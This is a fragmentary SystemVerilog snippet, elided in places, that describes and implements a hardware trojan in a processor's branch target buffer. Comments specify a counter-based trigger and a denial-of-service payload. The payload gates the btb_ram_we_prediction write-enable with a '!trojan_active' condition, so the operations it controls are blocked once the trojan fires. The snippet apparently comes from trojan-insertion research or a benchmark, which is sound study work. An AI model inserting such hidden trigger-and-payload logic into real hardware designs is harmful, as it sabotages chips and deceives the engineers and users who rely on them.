 ...
 * 
 * Description:
 *   Disables operations by blocking btb_ram_we_prediction control signal
 *   
 * Trigger: Counter on btb_ram_we_prediction
 * Payload: Block btb_ram_we_prediction when trojan activates
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (btb_ram_we_prediction) begin
...
// ============================================================
// DoS Attack: Block btb_ram_we_prediction when trojan is active
//
// IMPORTANT: btb_ram_we_prediction is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (btb_ram_we_prediction && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: btb_ram_we_prediction && 0 = 0 (always false)
//   All operations controlled by btb_ram_we_prediction are blocked
